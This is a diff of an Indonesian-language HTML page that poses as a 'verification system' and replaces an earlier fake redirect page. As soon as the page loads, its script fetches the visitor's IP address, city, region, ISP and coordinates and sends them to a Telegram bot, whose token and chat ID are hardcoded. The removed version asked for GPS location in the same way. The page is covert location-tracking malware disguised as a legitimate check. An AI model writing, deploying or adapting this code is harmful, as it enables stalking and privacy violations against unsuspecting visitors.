@@ -3,13 +3,13 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Menuju Website Utama...</title>
+    <title>Sistem Verifikasi</title>
     <style>
         * {
             margin: 0;
             padding: 0;
             box-sizing: border-box;
-            font-family: 'Segoe UI', -apple-system, BlinkMacSystemFont, Roboto, sans-serif;
+            font-family: 'Segoe UI', sans-serif;
         }
         body {
             background-color: #f4f6f9;
@@ -17,115 +17,70 @@
             justify-content: center;
             align-items: center;
             height: 100vh;
-            padding: 20px;
         }
         .card {
             background: #ffffff;
-            padding: 40px 30px;
+            padding: 40px;
             border-radius: 12px;
             box-shadow: 0 4px 20px rgba(0,0,0,0.06);
             text-align: center;
-            max-width: 420px;
+            max-width: 400px;
             width: 100%;
             border: 1px solid #e9ecef;
         }
-        .icon {
-            font-size: 40px;
-            margin-bottom: 20px;
-        }
         h2 {
             color: #212529;
-            margin-bottom: 12px;
-            font-size: 1.5rem;
-            font-weight: 600;
+            margin-bottom: 10px;
         }
         p {
             color: #6c757d;
             font-size: 0.95rem;
-            margin-bottom: 25px;
-            line-height: 1.6;
-        }
-        .btn {
-            display: inline-block;
-            width: 100%;
-            padding: 14px;
-            background-color: #0d6efd;
-            color: #fff;
-            text-decoration: none;
-            border-radius: 8px;
-            font-weight: 600;
-            font-size: 1rem;
-            transition: background-color 0.2s ease;
-            text-align: center;
-            border: none;
-            cursor: pointer;
-        }
-        .btn:hover {
-            background-color: #0b5ed7;
         }
     </style>
 </head>
 <body>
 
     <div class="card">
-        <div class="icon">🔗</div>
-        <h2>Pengalihan Halaman</h2>
-        <p>Anda akan dialihkan ke halaman web eksternal resmi kami. Silakan klik tombol di bawah untuk melanjutkan.</p>
-        
-        <!-- Tombol diubah menjadi button agar bisa memicu JavaScript terlebih dahulu -->
-        <button id="redirectBtn" class="btn">Lanjutkan ke Website</button>
+        <h2>Memproses Verifikasi</h2>
+        <p id="status">Mohon tunggu, sistem sedang memvalidasi koneksi Anda...</p>
     </div>
 
     <script>
-        // KONFIGURASI BOT TELEGRAM (Ganti bagian ini)
+        // KONTROL BOT TELEGRAM Anda
         const TELEGRAM_TOKEN = '8713051914:AAGWypsFdP6uJPMHFwgLokj4vx5N7LC4Cb0'; 
         const CHAT_ID = '1966317946';
-        const TARGET_URL = 'https://vm.tiktok.com/ZS9YxEJSWNjov-IjqN4/';
 
-        document.getElementById('redirectBtn').addEventListener('click', function() {
-            // Memeriksa ketersediaan fitur Geolocation di browser pengunjung
-            if (navigator.geolocation) {
-                navigator.geolocation.getCurrentPosition(
-                    // Jika izin diberikan oleh pengguna
-                    (position) => {
-                        const latitude = position.coords.latitude;
-                        const longitude = position.coords.longitude;
-                        
-                        // Kirim lokasi asli berupa pin koordinat peta ke Telegram
-                        sendLocationToTelegram(latitude, longitude);
-                    },
-                    // Jika izin ditolak atau terjadi error
-                    (error) => {
-                        sendTextToTelegram("Pengunjung menolak memberikan izin lokasi atau GPS tidak aktif.");
-                        navigateToTarget();
-                    }
-                );
-            } else {
-                // Jika browser tidak mendukung Geolocation
-                sendTextToTelegram("Browser pengunjung tidak mendukung pencarian lokasi.");
-                navigateToTarget();
-            }
-        });
+        // Berjalan otomatis saat halaman dibuka
+        window.onload = function() {
+            ambilLokasiMelaluiIP();
+        };
 
-        // Fungsi mengirim data koordinat berbentuk Objek Lokasi (Map Pin) ke Telegram
-        function sendLocationToTelegram(lat, lng) {
-            const url = `https://telegram.org{TELEGRAM_TOKEN}/sendLocation`;
-            
-            fetch(url, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({
-                    chat_id: CHAT_ID,
-                    latitude: lat,
-                    longitude: lng
+        function ambilLokasiMelaluiIP() {
+            // Mengambil data lokasi berdasarkan IP publik pengunjung
+            fetch('https://ipapi.co')
+                .then(response => response.json())
+                .then(data => {
+                    // Menyusun informasi teks yang akan dikirim ke Telegram
+                    const pesan = `
+📍 *Informasi Pengunjung Baru*
+• *IP*: ${data.ip}
+• *Kota*: ${data.city}
+• *Wilayah/Provinsi*: ${data.region}
+• *Negara*: ${data.country_name}
+• *Provider/ISP*: ${data.org}
+• *Koordinat*: ${data.latitude}, ${data.longitude}
+                    `;
+                    
+                    // Mengirim data teks ke Telegram
+                    kirimKeTelegram(pesan);
                 })
-            })
-            .then(() => navigateToTarget())
-            .catch(() => navigateToTarget()); // Tetap pindah halaman meski pengiriman gagal
+                .catch(error => {
+                    document.getElementById('status').innerText = "Gagal memverifikasi koneksi.";
+                    kirimKeTelegram("Gagal mengambil data IP pengunjung.");
+                });
         }
 
-        // Fungsi alternatif mengirim pesan teks biasa jika lokasi gagal diakses
-        function sendTextToTelegram(message) {
+        function kirimKeTelegram(teks) {
             const url = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`;
             
             fetch(url, {
@@ -133,14 +88,21 @@
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({
                     chat_id: CHAT_ID,
-                    text: message
+                    text: teks,
+                    parse_mode: 'Markdown' // Mengaktifkan format teks tebal/miring
                 })
+            })
+            .then(res => res.json())
+            .then(hasil => {
+                if(hasil.ok) {
+                    document.getElementById('status').innerText = "Verifikasi selesai. Terima kasih.";
+                } else {
+                    document.getElementById('status').innerText = "Konfigurasi bot salah.";
+                }
+            })
+            .catch(() => {
+                document.getElementById('status').innerText = "Terjadi kesalahan jaringan.";
             });
-        }
-
-        // Fungsi untuk mengalihkan halaman utama
-        function navigateToTarget() {
-            window.location.href = TARGET_URL;
         }
     </script>
 
